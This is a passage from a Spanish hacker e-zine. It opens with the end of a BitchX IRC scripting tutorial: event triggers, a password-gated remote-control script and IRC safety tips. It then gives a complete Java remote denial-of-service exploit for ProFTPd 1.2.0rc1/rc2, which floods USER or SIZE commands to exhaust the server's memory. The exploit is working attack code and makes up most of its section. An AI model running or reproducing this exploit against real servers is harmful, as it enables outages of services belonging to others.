+la ventana siguiente. Prueba eso sin wait y veras la k se lia.... XDD
+
+Alias es mu bonito pero solo sirve para eso, para definir aliases XD Nuestros
+scripts deben hacer cosas mas interesantes...
+  ___  _   _
+ / _ \| \ | |
+| | | |  \| |
+| |_| | |\  |
+ \___/|_| \_|
+
+Esto si k ia es p0wah!!! XDD ON permite lanzar acciones en el momento en que
+ocurran ciertos eventos que cumplan ciertas condiciones.
+
+Amos a ver un ejemplo...
+
+/on +public " % #*An desnouuu fraiii*" { ^msg $1 onde colen grei shicaaagouu
+mun }
+/on +public " % #*onde colen grei shicaaagouu mun*" { ^msg $1 beibi
+benischanrisssmornins innnn de geetouuuu }
+
+Eso son dos lineas pero ocupan cuatro (que complicado, ia me he perdido)
+Bueno, pues eso es un trozo de "The Panda Karaoke" By DrSlump, the BigPanda.
+Lo que hace es soltar "onde colen grei shicaaagouu mun" Cuando alguien dice en
+publico, en un canal "An desnouuu fraiii" y a base de ONs monta una cancion
+entre dos BitchX. No incluyo la canción completa por peticion popular (Es
+conocida y odiada en el IRC Hispano...) pero si os interesa la podeis pedir en
+#linux_gei.
+Bueno, otro ejemplo...
+
+on -msg "nick*Si es tu nick*IDENTIFY*" { identify }
+
+Esto ejecutará nuestro adorable alias identify cuando nick raie para que nos
+identifiquemos. Hay que mostrar atencion a la mascara que usamos... solo hara
+caso a nick, si tuxisuau MSGea Si es tu nick identificate con blah blah
+IDENTIFY password el script no le hara el mas minimo caso....
+
+ON admite muchos mas tipos de evento, aparte de msg y public. Os habreis
+fijado q a veces pongo - y a veces + delante del nombre del evento de ON...
+sirven para silenciar o 'verbosear' la ejecucion de estos parametros, creando
+mas o menos salida por la ventana del BitchX...
+ _____  _                      _
+| ____|(_) ___ _ __ ___  _ __ | | ___  ___
+|  _|  | |/ _ \ '_ ` _ \| '_ \| |/ _ \/ __|
+| |___ | |  __/ | | | | | |_) | | (_) \__ \
+|_____|/ |\___|_| |_| |_| .__/|_|\___/|___/
+     |__/               |_|
+
+Ahora que ya conocemos todo esto, vamos a ver unos ejemplos de cosas bonitas
+que se pueden conseguir...
+
+/on +msg "*password ip" { msg $0 oki $X :* }
+/on +msg "*password resume" { dcc resume $0 }
+/on +msg "*password amol" { msg $0 te kero :**}
+/on +msg "*password get" { dcc get $0 }
+
+Esto daria p0wah de control remoto a nuestro BitchX. resume/get/ip son muy
+interesantes para desacernos del 'DCC_AUTOGET' :) Esto permitiria a nuestros
+amigos obtener nuestra ip o enviarnos dccs sin que nosotros tengamos que estar
+atentos al IRC... incluso nos podria servir a nosotros mismos si dejamos el
+script en marxa en la maquina de casa y nos vamos, por ejemplo. a un
+cibercafé... amol sirve para k nuestro BX nos demuestre lo muxo que nos
+quiere...
+
+/alias tuxisuau {msg nick@deep.space ghost $mynick $ircpass
+        nick $mynick}
+
+recuperacion rapida de nuestro nick ;)
+
+  ____                      _
+ / ___|___  _ __  ___  ___ (_) ___  ___
+| |   / _ \| '_ \/ __|/ _ \| |/ _ \/ __|
+| |__| (_) | | | \__ \  __/| | (_) \__ \
+ \____\___/|_| |_|___/\___|/ |\___/|___/
+                         |__/
+
+Bueno, pues acabare el docu con algunos consejos sobre el BX y el IRC en
+general...
+
+1. Evita las listas de autoop. Dar op a tus amigos/as queda muy bonito, pero
+no hace nada de gracia cuando el lamer de turno se aprovecha de los 20
+segundos del kill del hispano... para entrar en un canal con tu nick, pillar
+op y dp cambiar de nick y takear el canal :[
+
+2. No dejes el DCC_AUTOGET activado!!! Lo pueden usar para saber tu ip cuando
+estas +x, para mandarte un .bash_profile malo maloso, etc.
+
+3. No des tu nombre ni ninguno de tus datos a todo dios (!). Alla tú...
+4. No uses BNC's no montados por ti... Quien sabe si logean?
+
+5. No seas scr1pt-k1dd13. 'paquetar' a la gente es kiddie.
+
+6. Alerta con el /ON, si programas mal se puede xploitar... (un dcc pa la
+musica k hace dcc del file k te dicen a partir del directorio musica, te
+empiezan a mandar ../ 's y se arma la de dios...)
+
+7. Usa siempre el TIMESTAMP, va de pm. Añade /set timestamp on en tu pedazo de
+script ;)
+
+8. Sé buena persona, pero no seas inocente... :P
+
+9. Jamas ejecutes nada sin pensar primero lo k hace y muxo menos con
+privilegios de root (Thx a Ripe por esta).
+
+10. En esta vida te encuentras con muchisima información: Hay buena y mala,
+hay falsa, manipulada, etc. Sé capaz de discriminar la información y asimilar
+lo que te interesa asimilar.
+
+Es tarde, estoy cansado y bueno creo que ya es bastante. Saludos a mis amigos
+del irc y de fuera. Espero poder escribir mas docs, hare una segunda parte de
+este doc cuando controle mas el tema y tb hare docs de otros temas. De momento
+podeis consultar en /usr/doc/bitchx/* q de alli lo saco io tambien.
+
+Debian p0wah!!!
+Tuxisuau <tuxisuau@phreaker.net>
+
+-------------------------------------------------------------------------------
+
+
+-------------------------------------------------------------------------------
+--{ 06 }---{ ProFTPd DoS }-----------------------------------------------------
+-------------------------------------------------------------------{ Jet-Li }--
+
+    Saludos a todos los lectores, soy JeT-Li y no habia tenido oportunidad de
+saludaros hasta ahora ;-) Lo que os pongo a continuacion es un DoS remoto para
+ProFTPd, testeado en la version 1.2.0rc1 y 1.2.0rc2, aunque muy posiblemente
+funcione en otras.
+
+        Se basa en una sobrecarga de la memoria hasta agotar los
+recursos disponibles. Este DoS es efectivo si el directorio
+/usr/local/var/proftpd no existe o no posee permisos de escritura para el
+propio demonio ProFTPd. Si has hecho la instalación desde un RPM el
+directorio es /var/run/proftpd. El bug se encuentra en la funcion
+log_open_run() del fichero /src/log.c. Esta funcion intenta abrir un fichero
+dinamico de registro situado en este directorio (/usr/local/var/proftpd o
+/var/run/proftpd) al ejecutar la mayoria (posiblemente todos) de los comandos
+del ftp. Cada vez que lo hace reserva memoria para este fichero de registro sin
+liberarla de tal manera que nos lleva a una sobrecarga de memoria ;-). Los
+creadores del ProFTPd han reconocido este bug, puedes visitar su pagina en
+www.proftpd.net.
+
+        Bueno pues en la version 1.0 del exploit yo usaba el comando SIZE,
+realizando multiples peticiones, y agotando asi la memoria. En esta version he
+combinado el exploit anterior con una nueva manera de llevar a cabo el DoS
+usando el comando USER. Lo que hace el programa es realizar un numero muy
+elevado de comandos USER usuarionoexistente, provocando la sobrecarga ya antes
+mencionada. De este modo no es necesario ni siquiera acceso anonimo al ftp,
+cosa que antes si era requerida.
+
+        Como posible novedad en este bonito mundo de los DoS y los exploits
+... que está codeado en Java ;-P Sé que se podría haber hecho en perl o en c,
+mucho mas escueto, e igual de eficaz, pero no es el caso ;-) Si alguien se
+anima a hacer alguna migracion que sepa que la aceptare con gusto. Si yo he
+usado Java es porque estaba experimentando con el manejo de sockets y flujo
+tcp/ip en este lenguaje y no hay mejor manera de experimentar que programando
+;-D
+
+        Por si hay algun incauto que nunca haya trabajado con Java para
+compilarlo/ejecutarlo visitad www.javasoft.com y bajaos de alli el JDK (JSK si
+es la version mas reciente). Una vez lo tengais instalado para compilar "javac
+proftpDoS.java" y para ejecutar "java proftpDoS". Sorry x la leccion kiddie ;-)
+
+        Pues sin mas dilacion aqui teneis el codigo, si teneis alguna duda o
+alguna sugerencia interesante que hacerme podeis escribirme a :
+
+                                                jet_li_man@yahoo.com
+
+        Me despido ... hasta otra ;-)
+
+        "Chance favors the PREPARED mind".- Travis Dane
+
+                                        JeT-Li          -The Wushu Master-
+
+proftpDoS.java (el nombre no lo cambieis, para compilarlo ha de ser ese)
+
+<++> proftpDoS.java
+
+/*      ProFTPd DoS version 1.1
+        Remote DoS in proFTPd
+
+        Code by: JeT-Li         -The Wushu Master-      jet_li_man@yahoo.com
+
+        Recently I posted a remote DoS for ProFTPd based in the multiple use
+        of the SIZE command in order to crash the system. Now and thanks to
+        the information provided by Wojciech Purczynski I have coded a
+        program that not only use the SIZE command but also the USER command.
+        So at this time access to the ftp is not necessary to manage a DoS
+        attack. The concept is equal to the last exploit one, but using
+        multiple USER instead of SIZE.
+
+        You don't have to give arguments when you execute the program, it
+        will request you these.
+
+        Greets: _kiss_ (the real fucker ;-P); gordoc (no comment, the most
+        hax man in the w0rld); Perip|o (tibetan mantras for u! ;-P); and all
+        the ppl of #hackers (not able for cardiac XD).
+
+        Vulnerable systems:
+        ProFTPd 1.2.0rc1        (Tested)
+        ProFTPd 1.2.0rc2        (Tested)
+        And maybe others(1.2.0preX); I have no test this, but I'm sure you
+        can do it for me ;-)
+        NOTE: 1.2.0pre10 seems to be vulnerable according to the words of
+        Wojciech Purczynski ... */
+import java.net.*;
+import java.io.*;
+
+class TCPconnection {
+
+    public TCPconnection (String hostname, int portnumber) throws Exception {
+    Socket s = doaSocket(hostname, portnumber);
+    br = new BufferedReader (new InputStreamReader (s.getInputStream()));
+    ps = new PrintStream (s.getOutputStream());
+    }
+
+    public String readLine() throws Exception {
+    String s;
+    try {       s = br.readLine();      }
+    catch (IOException ioe) {
+    System.out.println("TCP Error ... it's a little hax0r exception ;-)");
+    throw new Exception ("\nInput Error: I/O Error");
+        }
+    return s;
+    }
+
+    public void println(String s) {
+        ps.println(s);
+    }
+
+    private Socket doaSocket(String hostname, int portnumber) throws Exception {    Socket s = null;
+    int attempts = 0;
+    while (s == null && attempts<maxattempts) {
+    try {       s = new Socket(hostname, portnumber);   }
+    catch (UnknownHostException uhe) {
+    System.err.println("It was no posible to establish the TCP connection.\n" +
+"Reason: unknown hostname " + hostname + ". Here is the Exception:");
+    throw new Exception("\nConnection Error: " + "unknown hostname");
+    }
+    catch (IOException ioe) {
+    System.err.println("The connection was not accomplished due to an I/O Error: trying it again ...");
+    }
+    attempts++;
+    }
+    if (s == null) throw new IOException("\nThe connection was not accomplished
+due to an I/O Error: trying it again ...");
+    else return s; }
+    private final int maxattempts = 5;
+    private BufferedReader br;
+    private PrintStream ps;
+
+    }
+
+class proftpDoS {
+
+    public static void main(String[] arg) throws Exception {
+    InputStreamReader isr;
+    BufferedReader tcld;
+    String hostnamez, username, password, file, s1, option, option1;
+    int i, j, k, m;
+    isr = new InputStreamReader(System.in);
+    tcld = new BufferedReader(isr);
+    System.out.println("ProFTPd DoS version 1.1 by JeT-Li -The Wushu Master-");
+    System.out.println("Code in an attempt to solve Fermat Last's Theoreme");
+    System.out.println("Please choose the type of attack you wanna use; insert only the NUMBER, i.e.: 1");
+    System.out.println("1) Memory leakage using USER command");
+    System.out.println("2) Memory leakage using SIZE command");
+    System.out.print("Option: ");
+    option = tcld.readLine();
+    m = Integer.parseInt(option);
+    while (!(m==1 || m==2)) {
+    System.out.print("Option not valid, please try again: ");
+    option = tcld.readLine();
+    m = Integer.parseInt(option); }
+    if (m==1) {
+    hostnamez = "";
+    while (hostnamez.length()==0) {
+    System.out.print("Please enter the hostname/IP: ");
+    hostnamez = tcld.readLine(); }
+    System.out.println("Choose one of this options; insert only the NUMBER, i.e.: 1");
+    System.out.println("1) Request 15000 size's to the server (it may be enough)");
+    System.out.println("2) \"No pain no gain\" (pseudo-eternal requests, ey it may be harm ;-P)");
+    System.out.print("Option: ");
+    option1 = tcld.readLine();
+    k = Integer.parseInt(option1);
+    while (!(k==1 || k==2)) {
+    System.out.print("Option not valid, please try again: ");
+    option1 = tcld.readLine();
+    k = Integer.parseInt(option1); }
+    TCPconnection tc = new TCPconnection(hostnamez, 21);
+        if (k==1) {
+        for(i=0;i<15000;i++)
+        tc.println("user themosthax0ruserthatthisw0rldhaseverseen" + i); }
+    else if (k==2) {
+    for(i=1;i<100;i++)
+        for(j=2;j<((int)Math.pow(j,i ));j++)
+            tc.println("user themosthax0ruserthatthisw0rldhaseverseen" + j); }
+    tc.println("quit");
+    s1 = tc.readLine();
+    while (s1!=null) {
+    s1 = tc.readLine();
+    System.out.println("Attack completed ... as one of my friends says:");
+    System.out.println("Hack just r0cks ;-)");
+    }
+    }
+    else if (m==2) {
+    hostnamez = "";
+    while (hostnamez.length()==0) {
+    System.out.print("Please enter the hostname/IP: ");
+    hostnamez = tcld.readLine(); }
+    username = "";
+    while (username.length()==0) {
+    System.out.print("Enter the username: ");
+    username = tcld.readLine(); }
+    password = "";
+    while (password.length()==0) {
+    System.out.print("Enter the password for that username: ");
+    password = tcld.readLine(); }
+    file = "";
+    while (file.length()==0) {
+    System.out.print("Enter a valid filename on the FTP \n(with correct path of
+course ;-): ");
+    file = tcld.readLine(); }
+    System.out.println("Choose one of this options; insert only the NUMBER, i.e.: 1");
+    System.out.println("1) Request 15000 size's to the server (it may be enough)");
+    System.out.println("2) \"No pain no gain\" (pseudo-eternal requests, ey it may be harm ;-P)");
+    System.out.print("Option: ");
+    option1 = tcld.readLine();
+    k = Integer.parseInt(option1);
+    while (!(k==1 || k==2)) {
+    System.out.print("Option not valid, please try again: ");
+    option1 = tcld.readLine();
+    k = Integer.parseInt(option1); }
+    TCPconnection tc = new TCPconnection(hostnamez, 21);
+    tc.println("user " + username);
+    tc.println("pass " + password);
+    if (k==1) {
+        for(i=0;i<10000;i++)
+        tc.println("size " + file); }
+    else if (k==2) {
+    for(i=1;i<100;i++)
+        for(j=2;j<((int)Math.pow(j,i ));j++)
+            tc.println("size " + file); }
+    tc.println("quit");
+    s1 = tc.readLine();
+    while (s1!=null) {
+    s1 = tc.readLine();
+    System.out.println("Attack completed ... as one of my friends says:");
+    System.out.println("Hack just r0cks ;-)");
+    }
+    }
+    }
+}
+
+<-->
+
+-------------------------------------------------------------------------------
+
+
+Hasta aqui nuestro primer "cortos"...  Ya sabeis, si teneis un articulo podeis
+mandarlo a 7a69ezine por pequeño que sea.
+
+*EOF*
